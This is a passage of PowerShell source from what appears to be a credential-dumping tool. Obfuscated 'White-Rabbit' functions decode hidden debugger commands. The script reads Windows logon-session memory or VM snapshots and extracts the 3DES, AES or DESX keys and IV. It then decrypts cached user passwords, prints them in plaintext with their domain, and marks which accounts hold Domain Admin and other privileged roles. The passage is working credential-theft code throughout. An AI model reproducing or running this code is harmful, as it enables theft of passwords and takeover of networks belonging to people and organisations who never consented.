    $chain = (("1*31&1*31&1*1&1*11&1*32&1*18&1*32&1*24&1*33&1*34&1*14&1*35&1*36&1*15&1*32&1*37&1*15&1*38"-split "&")-split "_"|%{if($_-match "(\d+)\*(\d+)"){"$([char][int]("10T32T47T92T95T40T46T41T64T70T111T108T119T116T104T101T105T82T97T98T58T45T41T112T114T107T110T98T103T109T99T100T115T118T33T51T68T75T121"-split "T")[$matches[2]])"*$matches[1]}})
    $chain = $chain[0]+$chain[1]
    return $chain
}

function White-Rabbit2 {
    $chain = (("1*31&1*31&1*1&1*11&1*32&1*12&1*18&1*32&1*24&1*33&1*34&1*14&1*35&1*36&1*15&1*32&1*37&1*15&1*38"-split "&")-split "_"|%{if($_-match "(\d+)\*(\d+)"){"$([char][int]("10T32T47T92T95T40T46T41T64T70T111T108T119T116T104T101T105T82T97T98T58T45T41T112T114T107T110T98T103T109T99T100T115T118T33T51T68T75T121"-split "T")[$matches[2]])"*$matches[1]}})
    $chain = $chain[0]+$chain[5]
    return $chain
}

function White-Rabbit3 {
    $chain = (("1*31&1*31&1*1&1*11&1*32&1*18&1*32&1*24&1*33&1*34&1*14&1*39&1*15&1*32&1*37&1*15&1*38"-split "&")-split "_"|%{if($_-match "(\d+)\*(\d+)"){"$([char][int]("10T32T47T92T95T40T46T41T64T70T111T108T119T116T104T101T105T82T97T98T58T45T41T112T114T107T110T98T103T109T99T100T115T118T33T51T68T75T121T65"-split "T")[$matches[2]])"*$matches[1]}})
    $chain = Clear-Chain ($chain)
    return $chain
}

function White-Rabbit4 {
    $chain = (("1*31&1*19&1*1&1*11&1*32&1*18&1*32&1*24&1*33&1*34&1*40&1*26&1*16&1*13&1*16&1*18&1*11&1*16&1*41&1*18&1*13&1*16&1*10&1*26&1*42&1*15&1*30&1*13&1*10&1*24"-split "&")-split "_"|%{if($_-match "(\d+)\*(\d+)"){"$([char][int]("10T32T47T92T95T40T46T41T64T70T111T108T119T116T104T101T105T82T97T98T58T45T41T112T114T107T110T98T103T109T99T100T115T118T33T51T68T75T121T65T73T122T86"-split "T")[$matches[2]])"*$matches[1]}})
    $chain = Clear-Chain ($chain)
    return $chain
}
function White-RabbitObs1 {
    $chain = (("1*31&1*31&1*1&1*11&1*32&1*18&1*32&1*24&1*33&1*34&1*28&1*4&1*23&1*36&1*15&1*32&1*43&1*37&1*15&1*38"-split "&")-split "_"|%{if($_-match "(\d+)\*(\d+)"){"$([char][int]("10T32T47T92T95T40T46T41T64T70T111T108T119T116T104T101T105T82T97T98T58T45T41T112T114T107T110T98T103T109T99T100T115T118T33T51T68T75T121T65T73T122T86T88"-split "T")[$matches[2]])"*$matches[1]}})
    $chain = Clear-Chain ($chain)
    return $chain
}
function White-RabbitOrWhat {
    $chain = (("1*31&1*31&1*1&1*12&1*31&1*16&1*28&1*15&1*32&1*13&1*34&1*11&1*4&1*44&1*10&1*28&1*45&1*15&1*32&1*32&1*44&1*16&1*32&1*13"-split "&")-split "_"|%{if($_-match "(\d+)\*(\d+)"){"$([char][int]("10T32T47T92T95T40T46T41T64T70T111T108T119T116T104T101T105T82T97T98T58T45T41T112T114T107T110T98T103T109T99T100T115T118T33T51T68T75T121T65T73T122T86T88T76T83"-split "T")[$matches[2]])"*$matches[1]}})
    $chain = Clear-Chain ($chain)
    return $chain
}function White-RabbitOK {
    $chain = (("1*31&1*31&1*1&1*11&1*32&1*12&1*18&1*32&1*24&1*&1*39&1*34&1*14&1*35&1*36&1*15&1*32&1*37&1*15&1*38"-split "&")-split "_"|%{if($_-match "(\d+)\*(\d+)"){"$([char][int]("10T32T47T92T95T40T46T41T64T70T111T108T119T116T104T101T105T82T97T98T58T45T41T112T114T107T110T98T103T109T99T100T115T118T33T51T68T75T121T117"-split "T")[$matches[2]])"*$matches[1]}})
    $chain = $chain[0]+$chain[9]
    return $chain
}

function White-RabbitPi {
    $chain = (("1*31&1*19&1*1&1*11&1*32&1*18&1*32&1*24&1*33&1*34&1*28&1*4&1*9&1*15&1*15&1*31&1*19&1*18&1*30&1*25"-split "&")-split "_"|%{if($_-match "(\d+)\*(\d+)"){"$([char][int]("10T32T47T92T95T40T46T41T64T70T111T108T119T116T104T101T105T82T97T98T58T45T41T112T114T107T110T98T103T109T99T100T115T118T33T51T68T75T121T65T73T122T86T88"-split "T")[$matches[2]])"*$matches[1]}})
    $chain = Clear-Chain ($chain)
    return $chain
}

function White-RabbitCO {
    $chain = (("1*31&1*19&1*1&1*11&1*32&1*18&1*32&1*24&1*33&1*34&1*28&1*4&1*9&1*15&1*15&1*31&1*19&1*18&1*30&1*25"-split "&")-split "_"|%{if($_-match "(\d+)\*(\d+)"){"$([char][int]("10T32T47T92T95T40T46T41T64T70T111T108T119T116T104T101T105T82T97T98T58T45T41T112T114T107T110T98T103T109T99T100T115T118T33T51T68T75T121T65T73T122T86T88"-split "T")[$matches[2]])"*$matches[1]}})
    $chain = $chain[0]+$chain[1]
    return $chain
}

function White-RabbitContext {
    $chain = (("1*34&1*23&1*24&1*10&1*30&1*15&1*32&1*32&1*1&1*44&1*1&1*44&1*1&1*11&1*32&1*18&1*32&1*32&1*6&1*15&1*45&1*15"-split "&")-split "_"|%{if($_-match "(\d+)\*(\d+)"){"$([char][int]("10T32T47T92T95T40T46T41T64T70T111T108T119T116T104T101T105T82T97T98T58T45T41T112T114T107T110T98T103T109T99T100T115T118T33T51T68T75T121T65T73T122T86T88T48T120"-split "T")[$matches[2]])"*$matches[1]}})
    $chain = Clear-Chain ($chain)
    return $chain
}

function Get-SupportedSystemsInformations ($buffer, $fullScriptPath) {  
#Write-Log -streamWriter $global:streamWriter -infoToLog "test"     
    $chain = White-Rabbit1 
#Write-Log -streamWriter $global:streamWriter -infoToLog $chain   
    Write-InFile $buffer "$chain"
    $tab = Call-MemoryWalker $memoryWalker $file $fullScriptPath            
    $chain42 = White-Rabbit42
    $tabFA = ($tab -split ' ')                   
    $fi = [array]::indexof($tabFA,$chain42) + 4 
    $part1 = $tabFA[$fi]    
    $fi = [array]::indexof($tabFA,$chain42) + 5 
    $part2 = $tabFA[$fi]    
    $final = "$part2$part1"            
    $chain = "$chain42 $final"    
    Write-InFile $buffer $chain      
    $chain2 = White-Rabbit2  
    $tab = Call-MemoryWalker $memoryWalker $file $fullScriptPath        
    $sa = Clean-String $tab $mode $snapshot
    $command = "$chain2 $sa"    
    Write-InFile $buffer $command 
    $tab = &$memoryWalker -z $file -c "`$`$<$fullScriptPath;Q"                      
    $tabSplitted = ($tab -split ' ')         
    if($mode -eq 1 -or $mode -eq 132) { $start = 20}
    if($mode -eq 2) { $start = 30}
    if($mode -eq "8.1" -or $mode -eq "2r2" -or $mode -eq "2016") { $start = 40}    
    if($mode -eq "232") { $start = 38}    
    $j = 0
    $keyAddress = ""
    while($j -le 11) {
        if($j -eq 0) {
            $value = $start
            $comma = ""
        }
        else { 
            if($mode -eq 232) {
                if($j -eq 4) {
                    $value = $value+3
                    $comma = ", "
                }
                else {
                    $value++
                    $comma = ", "
                }
            }
            else {
                if($j -eq 2 -or $j -eq 10) {
                    $value = $value+3
                    $comma = ", "
                }
                else {
                    $value++
                    $comma = ", "
                }
            }
        }        
        $fi = [array]::indexof($tabSplitted,$chain2) + $value
        $keyAddress2 = $tabSplitted[$fi].Substring(0,2)
        $keyAddress1 = $tabSplitted[$fi].Substring(2,2)           
        $keyAddress += "$comma"+"0x$keyAddress1, 0x$keyAddress2"        
        $j++
    }        
    $keyToGet = $keyAddress                       
    $chain = White-Rabbit3
    Write-InFile $buffer $chain    
    $tab = Call-MemoryWalker $memoryWalker $file $fullScriptPath       
    $tabf = ($tab -split ' ')    
    $fi = [array]::indexof($tabf,$chain42) + 4
    $firstAddress1 = $tabf[$fi]    
    $fi = [array]::indexof($tabf,$chain42) + 5
    $firstAddress2 = $tabf[$fi]    
    $firstAddress = "$firstAddress2$firstAddress1"            
    $chain = "$chain42 $firstAddress" 
    Write-InFile $buffer $chain             
    $tab = Call-MemoryWalker $memoryWalker $file $fullScriptPath     
    $arraySecondAddress = ($tab -split ' ')  
    if($mode -eq 232) { 
        $fi = [array]::indexof($arraySecondAddress,$chain42) + 7
        $secondAddress = $arraySecondAddress[$fi]    
    }
    else {
        $fi = [array]::indexof($arraySecondAddress,$chain42) + 10
        $secondAddress1 = $arraySecondAddress[$fi]    
        $fi = [array]::indexof($arraySecondAddress,$chain42) + 11
        $secondAddress2 = $arraySecondAddress[$fi]    
        $secondAddress = "$secondAddress2$secondAddress1"  
    }             
    $chain = "$chain2 $secondAddress" 
    Write-InFile $buffer $chain         
    $tab = Call-MemoryWalker $memoryWalker $file $fullScriptPath     
    $ata = ($tab -split ' ')      
    if($mode -eq 1) { $start = 20}
    if($mode -eq 2) { $start = 30}    
    if($mode -eq 232) { $start = 38}
    $j = 0
    $keyAddress = ""
    while($j -le 7) {
        if($j -eq 0) {
            $value = $start
            $comma = ""
        }
        else {        
            if($mode -eq 232) {
                if($j -eq 4) {
                    $value = $value+3
                    $comma = ", "
                }
                else {
                    $value++
                    $comma = ", "
                }
            }
            else {
                if($j -eq 2) {
                    $value = $value+3
                    $comma = ", "
                }
                else {
                    $value++
                    $comma = ", "
                }
            }
        }
        $fi = [array]::indexof($ata,"$chain2") + $value
        $keyAddress2 = $ata[$fi].Substring(0,2)
        $keyAddress1 = $ata[$fi].Substring(2,2)           
        $keyAddress += "$comma"+"0x$keyAddress1, 0x$keyAddress2"        
        $j++
    }        
    $keyToGet2 = $keyAddress      
    $chain = White-Rabbit4           
    Write-InFile $buffer $chain         
    $iv = Call-MemoryWalker $memoryWalker $file $fullScriptPath                  
    $tab = ($iv -split ' ')        
    if($mode -eq 1 -or $mode -eq 132) { $start = 20}
    if($mode -eq 2) { $start = 30}
    $j = 0
    $iva = ""
    $start = 4
    while($j -le 7) {
        if($j -eq 0) {
            $value = $start
            $comma = ""
        }
        else {        
            $value++
            $comma = ", "        
        }
        $fi = [array]::indexof($tab,"db") + $value   
        if($j -eq 7) {
            $iva1 = $tab[$fi].Substring(0,2)
        }
        else {
            $iva1 = $tab[$fi]
        }
        $iva += "$comma"+"0x$iva1"
        $j++
    }   
    $ivHex = $iva             
    $chain = White-RabbitOrWhat
    Write-InFile $buffer $chain         
    $tab = Call-MemoryWalker $memoryWalker $file $fullScriptPath   
    $firstAddress = ""
    $tabf = ($tab -split ' ')    
    if($mode -eq 132 -or $mode -eq 232) {
        $fi = [array]::indexof($tabf,$chain42) + 4
        $firstAddress1 = $tabf[$fi]
        $firstAddress = "$firstAddress1" 
    }
    else {
        $fi = [array]::indexof($tabf,$chain42) + 4
        $firstAddress1 = $tabf[$fi]
        $fi = [array]::indexof($tabf,$chain42) + 5
        $firstAddress2 = $tabf[$fi]    
        $firstAddress = "$firstAddress2$firstAddress1" 
    }    
    $firstAddressList = $firstAddress        
    $nextEntry = ""
    $i = 0
Write-Output "The white rabbit found something...`n"
    while ($firstAddressList -ne $nextEntry) {
        if($i -eq 0) {
            $nextEntry = $firstAddress            
            $command = "$chain42 $firstAddress"
        }
        else {            
            $command = "$chain42 $nextEntry"
        }          
        Write-InFile $buffer $command         
        $ddSecond = Call-MemoryWalker $memoryWalker $file $fullScriptPath      
        if($mode -eq 132 -or $mode -eq 232) {
            if($i -eq 0) {
                $firstAddress = $firstAddress                                                 
            }
            else {        
                $firstAddress = $nextEntry                         
            }   
            $tab = ($ddSecond -split ' ')    
            $fi = [array]::indexof($tab,$chain42) + 4
            $nextEntry1 = $tab[$fi]        
            $nextEntry = "$nextEntry1" 
        }
        else {
            if($i -eq 0) {
                $firstAddress = $firstAddress                                                 
            }
            else {        
                $firstAddress = $nextEntry                
            } 
            $tab = ($ddSecond -split ' ')    
            $fi = [array]::indexof($tab,$chain42) + 4
            $nextEntry1 = $tab[$fi]     
            $fi = [array]::indexof($tab,$chain42) + 5
            $nextEntry2 = $tab[$fi]    
            $nextEntry = "$nextEntry2$nextEntry1" 
        }           
        Write-Progress -Activity "Getting valuable informations" -status "Running..." -id 1        
        $tab = ($ddSecond -split ' ')           
        if($mode -eq 1) { $start = 48}
        if($mode -eq 132 -or $mode -eq 232) { $start = 17}
        if($mode -eq 2 -or $mode -eq "8.1" -or $mode -eq "2r2" -or $mode -eq "2016") { $start = 24}         
        $fi = [array]::indexof($tab,$chain42) + $start
        $fi2 = [array]::indexof($tab,$chain42) + 42
        $la1 = $tab[$fi] 
        $dom1 = $tab[$fi2]
        $fi = [array]::indexof($tab,$chain42) + $start + 1
        $fi2 = [array]::indexof($tab,$chain42) + 42 + 1
        $la2 = $tab[$fi]  
        $dom2 = $tab[$fi2]     
        $la = "$la2$la1"     
	$dom = "$dom2$dom1"                                       
        if($la -eq "0000000000000000"){
            $start = 24
            $fi = [array]::indexof($tab,$chain42) + $start
            $la1 = $tab[$fi]       
            $fi = [array]::indexof($tab,$chain42) + $start + 1
            $la2 = $tab[$fi]      
            $la = "$la2$la1"                                                    
        }          
        $tu = White-RabbitOK        
        $chain = "$tu $la"      
        Write-InFile $buffer $chain         
        $loginDB = Call-MemoryWalker $memoryWalker $file $fullScriptPath      
        $tab = ($loginDB -split ' ')            
        $fi = [array]::indexof($tab,"du") + 4
        $loginPlainText1 = $tab[$fi]
        $loginPlainText = $loginPlainText1 -replace """",""            
	$tu = White-RabbitOK        
        $chain = "$tu $dom"      
        Write-InFile $buffer $chain         
        $domainDB = Call-MemoryWalker $memoryWalker $file $fullScriptPath      
        $tab = ($domainDB -split ' ')           
        $fi = [array]::indexof($tab,"du") + 4
        $domainplaintext = $tab[$fi] -replace """",""                         
        if (($global:partOfADomain -eq 1) -and ($adFlag -eq 1)) {
            $user = ""
            if(![string]::IsNullOrEmpty($loginPlainText)) {
	            $user = Get-ADUser -Filter {UserPrincipalName -like $loginPlainText -or sAMAccountName -like $loginPlainText}
	            if(![string]::IsNullOrEmpty($user)) {
	                $user = $user.DistinguishedName   
	                $enterpriseAdminsFlag = "false"
	                $schemaAdminsFlag = "false"
	                $domainAdminFlag = "false"
	                $administratorsFlag = "false"
	                $backupOperatorsFlag = "false"
	                if($global:enterpriseAdmins -ne ""){
	                    $enterpriseAdminsFlag = $global:enterpriseAdmins.Contains($user)
	                    if($enterpriseAdminsFlag -eq "true") {$loginPlainText = $loginPlainText + " = Enterprise Admins"}
	                }
	                if($global:schemaAdmins -ne ""){
	                    $schemaAdminsFlag = $global:schemaAdmins.Contains($user)
	                    if($schemaAdminsFlag -eq "true") {$loginPlainText = $loginPlainText + " = Schema Admins"}
	                }
	                $domainAdminFlag = $global:domainAdmins.Contains($user)
	                if($domainAdminFlag -eq "true") {$loginPlainText = $loginPlainText + " = Domain Admin"}
	                $administratorsFlag = $global:administrators.Contains($user)
	                if($administratorsFlag -eq "true") {$loginPlainText = $loginPlainText + " = Administrators"}
	                $backupOperatorsFlag = $global:backupOperators.Contains($user)
	                if($backupOperatorsFlag -eq "true") {$loginPlainText = $loginPlainText + " = Backup Operators"}            
	            }
            }
        }        
        Write-Progress -Activity "Getting valuable informations.." -status "Running..." -id 1         
        $tab = ($ddSecond -split ' ')    
        if($mode -eq 132 -or $mode -eq 232) { $start = 22}
        else {$start = 34}
        $fi = [array]::indexof($tab,$chain42) + $start
        $lp = $tab[$fi]
        $lp = $lp.Substring(6,2)            
        $numberBytes = [int][Math]::Ceiling([System.Convert]::ToInt32($lp,16)/8) * 4            
        if($mode -eq 132 -or $mode -eq 232) {
            $fi = [array]::indexof($tab,$chain42) + 23
            $secondAddress1 = $tab[$fi]     
            $secondAddress = "$secondAddress1" 
        }
        else {
            $fi = [array]::indexof($tab,$chain42) + 36
            $secondAddress1 = $tab[$fi]  
            $fi = [array]::indexof($tab,$chain42) + 37
            $secondAddress2 = $tab[$fi]    
            $secondAddress = "$secondAddress2$secondAddress1"        
        }        
        $secondAddressCommand = "$chain2 $secondAddress L$numberBytes"  
        Write-InFile $buffer $secondAddressCommand         
        $tab = Call-MemoryWalker $memoryWalker $file $fullScriptPath                                 
        $tabSplitted = ($tab -split ' ')                  
        $pa11 = ""
        $pa2 = ""
        $j = 1
        $modJ = $j
        $begin = 5
        $stringP = ""
        while($j -le $numberBytes) {        
            if($j -eq 1) {
                $value = $begin
                $comma = ""
            }
            else {
                $goNextLine = $modJ%9            
                if($goNextLine -eq 0) {
                    $value = $value+3
                    $comma = ", "
                    $modJ++
                }
                else {
                    $value++
                    $comma = ", "
                }
            }
            $fi = [array]::indexof($tabSplitted,"$chain2") + $value                
            $pa2 = $tabSplitted[$fi].Substring(0,2)
            $pa1 = $tabSplitted[$fi].Substring(2,2)            
            $stringP += "$comma"+"0x$pa1, 0x$pa2"
            $j++
            $modJ++
        }        
        $pHex = $stringP                            
        #Write-Log -streamWriter $global:streamWriter -infoToLog "Login : $loginPlainText"   
        #Write-Output "----------------------------------`nLogin : $loginPlainText`n"        
        if(($numberBytes % 8)) {        
            #$password = Get-DecryptAESPassword $pHex $keyToGet2 $ivHex
            $password = Get-DecryptTripleDESPassword $pHex $keyToGet $ivHex
        }
        else {        
            $password = Get-DecryptTripleDESPassword $pHex $keyToGet $ivHex
        }        
        #Write-Log -streamWriter $global:streamWriter -infoToLog "Password : $password"
        #Write-Output "`n$loginPlainText [===] $password"
	if($password) {
            if(($loginPlainText[-1]) -ne '$'){
                $password = [System.Text.UnicodeEncoding]::Unicode.GetString($password )
                #Write-Log -streamWriter $global:streamWriter -infoToLog "Password : $password"
                #Write-Output "Password : $password"
                Write-Output "`n$domainplaintext\$loginPlainText [===] $password"
            }    
        }
        $i++
    }
}

function Get-ObsoleteSystemsInformations ($buffer, $fullScriptPath) {   

    if($mode -eq 3) {
        $chain15 = White-Rabbit2
        $chain =  White-RabbitObs1  
        $chain42 = White-Rabbit42
        Write-InFile $buffer $chain         
        $tab = Call-MemoryWalker $memoryWalker $file $fullScriptPath   
        $arrayFirstAddress = ($tab -split ' ')    
        $fi = [array]::indexof($arrayFirstAddress,$chain42) + 4
        $firstAddress1 = $arrayFirstAddress[$fi]    
        $fi = [array]::indexof($arrayFirstAddress,$chain42) + 5
        $firstAddress2 = $arrayFirstAddress[$fi]    
        $firstAddress = "$firstAddress2$firstAddress1"         
        $int = 96
        $slashC = "/c"
        $chain = "$chain15 $slashC $int $firstAddress L48"      
        Write-InFile $buffer $chain         
        $tab = Call-MemoryWalker $memoryWalker $file $fullScriptPath                                 
        $arrayDesXAddressAddress = ($tab -split ' ')                              
        $passAddress1 = ""
        $j = 0
        $start = 7
        $keyAddress = ""
        while($j -le 71) {
            if($j -eq 0) {
                $value = $start
                $comma = ""
            }
            else {        
                $value++
                $comma = " "                
            }            
            $fi = [array]::indexof($arrayDesXAddressAddress,"dw") + $value                        
            $keyAddress2 = $arrayDesXAddressAddress[$fi].Substring(0,2)                      
            $keyAddress1 = $arrayDesXAddressAddress[$fi].Substring(2,2)                                  
            $keyAddress += "$keyAddress1$keyAddress2"
            $j++
        }                 
        $DESXKeyHex = $keyAddress     
        $feed = White-RabbitPi                 
        Write-InFile $buffer $feed        
        $tab = Call-MemoryWalker $memoryWalker $file $fullScriptPath                                                                                                                                      
        $array = ($tab -split ' ')    

        $j = 0
        $initializationVectorAddress = ""
        $start = 4
        while($j -le 7) {
            if($j -eq 0) {
                $value = $start
                $comma = ""
            }
            else {        
                $value++
                $comma = ", "        
            }
            $chain = White-RabbitCO
            $fi = [array]::indexof($array,$chain) + $value   
            if($j -eq 7) {
                $ia1 = $array[$fi].Substring(0,2)
            }
            else {
                $ia1 = $array[$fi]
            }
            $iva += "$ia1"
            $j++
        }   

        $g_Feedback = $iva        
        
        $Encoding = [System.Text.Encoding]::GetEncoding("windows-1252")

        $hexarray = $g_Feedback -split '(.{2})' | ? {$_}
        $hexcount = $hexarray.count
        $loopcount = 0
        $g_Feedback = ""
        while ($loopcount -le $hexcount -1) {
            $currenthex = $hexarray[$loopcount]          
            $dec = [Convert]::ToInt32($currenthex,16)    
            $String = $Encoding.GetString($dec)
            $conversion = [Char][Convert]::ToInt32($currenthex,16)    
            $g_Feedback = $g_Feedback + $String
            $loopcount = $loopcount + 1
        }        
        $hexarray = $DESXKeyHex -split '(.{2})' | ? {$_}
        $hexcount = $hexarray.count
        $loopcount = 0
        $DESXKeyHex = ""
        while ($loopcount -le $hexcount -1) {
            $currenthex = $hexarray[$loopcount]          
            $dec = [Convert]::ToInt32($currenthex,16)    
            $String = $Encoding.GetString($dec)
            $conversion = [Char][Convert]::ToInt32($currenthex,16)    
            $DESXKeyHex = $DESXKeyHex + $String
            $loopcount = $loopcount + 1
        }

        $chain = White-RabbitOrWhat   
        Write-InFile $buffer $chain         
        $tab = Call-MemoryWalker $memoryWalker $file $fullScriptPath                     

        $firstAddress = ""
        $arrayFirstAddress = ($tab -split ' ')    
        $fi = [array]::indexof($arrayFirstAddress,$chain42) + 4
        $firstAddress1 = $arrayFirstAddress[$fi]
        $fi = [array]::indexof($arrayFirstAddress,$chain42) + 5
        $firstAddress2 = $arrayFirstAddress[$fi]    
        $firstAddress = "$firstAddress2$firstAddress1"         
        $firstAddressList = $firstAddress
        $nextEntry = ""
        $i = 0
Write-Output "The white rabbit found something...`n"
        while ($firstAddressList -ne $nextEntry) {
            if($i -eq 0) {
                $nextEntry = $firstAddress                
                $command = "$chain42 $firstAddress"  
            }
            else {                 
                $command = "$chain42 $nextEntry"    
            }
                           
            Write-InFile $buffer $command         
            $ddSecond = Call-MemoryWalker $memoryWalker $file $fullScriptPath 

            if($i -eq 0) {
                $firstAddress = $firstAddress               
                $arrayNextEntryAddress = ($ddSecond -split ' ')    
                $fi = [array]::indexof($arrayNextEntryAddress,$chain42) + 4
                $nextEntry1 = $arrayNextEntryAddress[$fi]     
                $fi = [array]::indexof($arrayNextEntryAddress,$chain42) + 5
                $nextEntry2 = $arrayNextEntryAddress[$fi]    
                $nextEntry = "$nextEntry2$nextEntry1"                   
            }
            else {        
                $firstAddress = $nextEntry
                $arrayNextEntryAddress = ($ddSecond -split ' ')    
                $fi = [array]::indexof($arrayNextEntryAddress,$chain42) + 4
                $nextEntry1 = $arrayNextEntryAddress[$fi]     
                $fi = [array]::indexof($arrayNextEntryAddress,$chain42) + 5
                $nextEntry2 = $arrayNextEntryAddress[$fi]    
                $nextEntry = "$nextEntry2$nextEntry1"                
            }    

            Write-Progress -Activity "Getting valuable informations" -status "Running..." -id 1       
            $tab = ($ddSecond -split ' ')           
            $start = 28                     
            $fi = [array]::indexof($tab,$chain42) + $start
            $la1 = $tab[$fi]             
            $la = "$la1"                            
            $ok = White-RabbitOK
            if($la -eq "00000000"){
                $start = 16                     
                $fi = [array]::indexof($tab,$chain42) + $start
                $la1 = $tab[$fi]             
                $la = "$la1"    
                
                $laCommand = "$ok $la"                  
                [io.file]::WriteAllText($buffer, $laCommand) | Out-Null
                $lDB = &$memoryWalker -z $file -c "`$`$<$fullScriptPath;Q"

                $arraylDBAddress = ($lDB -split ' ')            
                $fi = [array]::indexof($arraylDBAddress,"du") + 4
                $lPT1 = $arraylDBAddress[$fi]
                $lPT = $lPT1
            }
            else {                
                $chain = "du $la"   
                Write-InFile $buffer $chain         
                $lDB = Call-MemoryWalker $memoryWalker $file $fullScriptPath               
                                
                $arraylDBAddress = ($lDB -split ' ')            
                $fi = [array]::indexof($arraylDBAddress,"du") + 4
                $lPT1 = $arraylDBAddress[$fi]
                $lPT = $lPT1
            }     

            Write-Progress -Activity "Getting valuable informations" -status "Running..." -id 1       
            $arrayPasswordAddress = ($ddSecond -split ' ')                            
            $fi = [array]::indexof($arrayPasswordAddress,$chain42) + 19
            $lengthPassword = $arrayPasswordAddress[$fi]
            $lengthPassword = $lengthPassword.Substring(6,2)        
            $numberBytes = [int][Math]::Ceiling([System.Convert]::ToInt32($lengthPassword,16)/8) * 4                
            $fi = [array]::indexof($arrayPasswordAddress,$chain42) + 22
            $secondAddress1 = $arrayPasswordAddress[$fi]                
            $secondAddress = "$secondAddress1"   
            
            $chain = "$chain15 $secondAddress L$numberBytes"                 
            Write-InFile $buffer $chain         
            $tab = Call-MemoryWalker $memoryWalker $file $fullScriptPath                
                   
            $arrayPasAddress = ($tab -split ' ')                  
            $passAddress1 = ""
            $passAddress2 = ""
            $j = 1
            $modJ = $j
            $begin = 5
            $stringPasswordHex = ""
            while($j -le $numberBytes) {        
                if($j -eq 1) {
                    $value = $begin
                    $comma = ""
                }
                else {
                    $goNextLine = $modJ%9            
                    if($goNextLine -eq 0) {
                        $value = $value+3
                        $comma = ", "
                        $modJ++
                    }
                    else {
                        $value++
                        $comma = ", "
                    }
                }
                $fi = [array]::indexof($arrayPasAddress,"$chain15") + $value                
                $passAddress2 = $arrayPasAddress[$fi].Substring(0,2)
                $passAddress1 = $arrayPasAddress[$fi].Substring(2,2)            
                $stringPasswordHex += "$passAddress1$passAddress2"
                $j++
                $modJ++
            }        

            $passwordHex = $stringPasswordHex                            
            #Write-Log -streamWriter $global:streamWriter -infoToLog "Login : $lPT"       
            Write-Output "----------------------------------`nLogin : $lPT`n"
            $cipherToDecrypt = $passwordHex                      
            $hexarray = $cipherToDecrypt -split '(.{2})' | ? {$_}
            if($hexarray){
                $hexcount = $hexarray.count
                $loopcount = 0
                $cipherToDecrypt = ""
                while ($loopcount -le $hexcount -1) {
                    $currenthex = $hexarray[$loopcount]          
                    $dec = [Convert]::ToInt32($currenthex,16)    
                    $String = $Encoding.GetString($dec)
                    $conversion = [Char][Convert]::ToInt32($currenthex,16)    
                    $cipherToDecrypt = $cipherToDecrypt + $String
                    $loopcount = $loopcount + 1
                }
            
                $passwordDec = Get-OldDec $DESXKeyHex $g_Feedback $cipherToDecrypt
                $passwordDecSplitted = $passwordDec -split " "
                $passwordDecSplitted = $passwordDecSplitted -replace " ",""
                $password = ""
                foreach($letter in $passwordDecSplitted){
                    if([int]$letter -lt 98182){
                        $password = $password + [char][int]$letter
                    }
                }            
                        
                #Write-Log -streamWriter $global:streamWriter -infoToLog "Password : $password"
                Write-Output "Password : $password`n"
            }
            $i++
        }        
    }
}

function Get-VMSnapshotInformations ($buffer, $fullScriptPath) {       
    $toAdd = 12
    $chainProcess = ""    
    $chain = White-RabbitContext    
    Write-InFile $buffer $chain    
    $tab = Call-MemoryWalker $memoryWalker $file $fullScriptPath 
    $tabFA = ($tab -split ' ')         
    $fi = [array]::indexof($tabFA,"PROCESS") + 1
    $value = $tabFA[$fi]
    $chainProcess = ".process /r /p $value" 
    if($mode -eq 1 -or $mode -eq 132 -or $mode -eq 2 -or $mode -eq "2r2" -or $mode -eq "232") {       
        $chain = White-Rabbit1    
        Write-InFile $buffer "$chainProcess;$chain"
        $tab = Call-MemoryWalker $memoryWalker $file $fullScriptPath       
        $chain42 = White-Rabbit42
        $tabFA = ($tab -split ' ')              
        $fi = [array]::indexof($tabFA,"Implicit") + $toAdd      
        $part1 = $tabFA[$fi]    
        $fi = [array]::indexof($tabFA,"Implicit") + $toAdd + 1
        $part2 = $tabFA[$fi]    
        $final = "$part2$part1"            
        $chain = "$chain42 $final"      
        Write-InFile $buffer "$chainProcess;$chain"     
        $chain2 = White-Rabbit2  
        $tab = Call-MemoryWalker $memoryWalker $file $fullScriptPath        
        $sa = Clean-String $tab $mode $snapshot
        $command = "$chain2 $sa"    
        Write-InFile $buffer "$chainProcess;$command" 
        $tab = &$memoryWalker -z $file -c "`$`$<$fullScriptPath;Q"                      
        $tabSplitted = ($tab -split ' ')         
        if($mode -eq 1) { $start = 20 + ($toAdd - 4)}
        if($mode -eq 2) { $start = 30 + ($toAdd - 4)}
        if($mode -eq "2r2") { $start = 40 + ($toAdd - 4)}    
        if($mode -eq "232") { $start = 38 + ($toAdd - 4)}    
        $j = 0
        $keyAddress = ""
        while($j -le 11) {
            if($j -eq 0) {
                $value = $start
                $comma = ""
            }
            else { 
                if($mode -eq 232) {
                    if($j -eq 4) {
                        $value = $value+3
                        $comma = ", "
                    }
                    else {
                        $value++
                        $comma = ", "
                    }
                }
                else {
                    if($j -eq 2 -or $j -eq 10) {
                        $value = $value+3
                        $comma = ", "
                    }
                    else {
                        $value++
                        $comma = ", "
                    }
                }
            }        
            $fi = [array]::indexof($tabSplitted,"Implicit") + $value
            $keyAddress2 = $tabSplitted[$fi].Substring(0,2)
            $keyAddress1 = $tabSplitted[$fi].Substring(2,2)           
            $keyAddress += "$comma"+"0x$keyAddress1, 0x$keyAddress2"        
            $j++
        }        
        $keyToGet = $keyAddress              
        $chain = White-Rabbit3
        Write-InFile $buffer "$chainProcess;$chain"    
        $tab = Call-MemoryWalker $memoryWalker $file $fullScriptPath       
        $tabf = ($tab -split ' ')    
        $fi = [array]::indexof($tabf,"Implicit") + $toAdd
        $firstAddress1 = $tabf[$fi]    
        $fi = [array]::indexof($tabf,"Implicit") + $toAdd + 1
        $firstAddress2 = $tabf[$fi]    
        $firstAddress = "$firstAddress2$firstAddress1"            
        $chain = "$chain42 $firstAddress" 
        Write-InFile $buffer "$chainProcess;$chain"
        $tab = Call-MemoryWalker $memoryWalker $file $fullScriptPath     
        $arraySecondAddress = ($tab -split ' ')  
        if($mode -eq 232) { 
            $fi = [array]::indexof($arraySecondAddress,"Implicit") + 7 + ($toAdd - 4)
            $secondAddress = $arraySecondAddress[$fi]    
        }
        else {
            $fi = [array]::indexof($arraySecondAddress,"Implicit") + 10 + ($toAdd - 4)
            $secondAddress1 = $arraySecondAddress[$fi]    
            $fi = [array]::indexof($arraySecondAddress,"Implicit") + 11 + ($toAdd - 4)
            $secondAddress2 = $arraySecondAddress[$fi]    
            $secondAddress = "$secondAddress2$secondAddress1"  
        }             
        $chain = "$chain2 $secondAddress" 
        Write-InFile $buffer "$chainProcess;$chain"         
        $tab = Call-MemoryWalker $memoryWalker $file $fullScriptPath     
        $ata = ($tab -split ' ')     
